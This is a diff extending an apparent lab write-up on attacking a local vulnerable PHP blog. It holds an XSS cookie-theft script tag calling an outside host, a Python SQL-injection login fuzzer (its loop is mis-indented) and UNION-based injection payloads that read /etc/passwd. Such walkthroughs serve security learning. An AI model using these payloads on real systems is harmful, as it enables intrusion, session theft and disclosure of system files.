@@ -138,3 +138,85 @@ This is a comment, harmless and oblivious <script src="http://10.0.2.2:5000/payl
 ```
 If successfully injected, every minute, the log of listening server will be filled with a base64 encoded text following with a plain text in utf-8 format. Take the cookie, put into local storage with the help of developer tool and access to admin page in the website, it should work.
 
+# 3. Attack with SQL injection
+
+Once complete the Cross-sites scripting attack, the admin's accessibility to the dashboard was retrieved. But currently, the dashboard only allows the admin to create the post and manage the welcome page (landing page) of the website.
+
+The intuition is very simple, find some text box - which allowing user's input to manipulate the system to execute any commands, any query that supplied by attackers.
+
+As mentioned before, there is also another page that allowing user's input, the `admin.php`. But attacking to that page is difficult, since the developer has blocked any log, thus the successfully guess and failed guess are the same. The only different lies on the returned code, `200 - succeeded` vs `302 -found`. A simple attacking for the SQL injection is trying to use the SQL payload containing comment instruction and always true condition (with `--` and `OR 1=1`).
+
+The attack script is described as below:
+```Python
+import requests
+
+url = "http://localhost:8080/login.php"
+ 
+payloads = [
+	"admin' -- ",
+	"admin'#",
+	"admin' OR 1=1#",
+	"admin' OR '1'='1",
+	"admin') OR ('1'='1",
+	"admin\" OR 1=1#",
+	"admin' OR 1=1 LIMIT 1#"
+]
+
+  
+
+print("Starting SQLi Fuzzer...")
+  
+for payload in payloads:
+	data = {
+		'username': payload,
+		'password': 'password'
+
+	}
+response = requests.post(url, data=data, allow_redirects=False)
+if response.status_code == 200:
+	print(f"[+] BYPASS SUCCESS (200 OK): {payload}")
+	break
+else:
+	print(f"[-] Failed (302): {payload}")
+```
+
+This is the famous blind attack, since there is not any information about the table name, the table's columns or what is the exact query to authenticate to this website, so the payload contains some common data that can probably bypass the login mechanism.
+
+But since the PHP code and maybe the developer sanitized the input before passing it to the query payload, this attack did not succeed in breaking the website. So the only way is to take the advantages of cross-sites scripting earlier.
+
+## 3.1. From XSS to SQL injection
+
+In the manage blog function, the URL of the website has this format:
+```Shell
+http://localhost:8080/admin/edit.php?id=1
+```
+
+![[Pasted image 20260502163738.png]]
+The question mark (?) indicates that the `id=1` is the argument for the SQL command, something should be similar to this: `SELECT something for something where condition 1 AND condition 2 AND id=1`.  So there are 2 things needed to find out:
+- How many arguments are there in the query to display the post (or to modify a post, or to create a post)?
+- The mapping of arguments and the input text box in the admin's page
+
+As we see, only the `Text` box is large enough to display meaningful data (the `passwd` file, or even showing a remote shell).
+
+Finding the vulnerability first, since one of the mandatory idea is forcing the website to show the error message, it will help the attacker to know or at least to guess the internal structural of the website, the table,...
+
+Adding a syntax error to the query is the simplest way, instead of a legitimate input (1), replace it with some syntax error (i.e adding a simple ' character after the `id=1`), right now, the `Title` and `Text` display the error message meaning the 2 text boxes can be used to display the internal structure as well as can be used for further exploited
+
+The next job is to find how many arguments and which argument is related to each text box. This is where `UNION` command comes handy. About this keyword `Query 1 UNION Query 2` return a result that these 2 queries must have the same number of arguments. With that characteristic, guessing the numbers of arguments is easy. 
+
+But because of that, `UNION` can not be used directly from the beginning, the `ORDER BY 1`. Normally, the `ORDER` keyword sorts the result according to the data passed after `BY`, but 1, or 2 or 3 tells the SQL to sort the result according to column 1, 2 or 3. So that with the action of keeping increasing number, we can figure out how many arguments in the returned result.
+
+After figuring out how many columns are present in the query, the echoing attack should be conducted. The purpose is to map text box into column. 
+
+```Bash
+http://localhost:8080/admin/edit.php?id=-1 UNION SELECT 1, 2, 3, 4#
+```
+
+The below URL is a way to inject the query, the hash symbol `#` is to comment all the code behind, and the `UNION SELECT` with `id=-1` is to return a NULL , so that the 1,2,3,4 would be put in the text box, we can easily know which columns were mapped to these text boxes.
+
+Finally, the payload is:
+```Bash
+id=-1 UNION SELECT 1, 2, LOAD_FILE('/etc/passwd'), 4#
+```
+
+Which would display the whole content of `/etc/passwd` at the `Text` field.
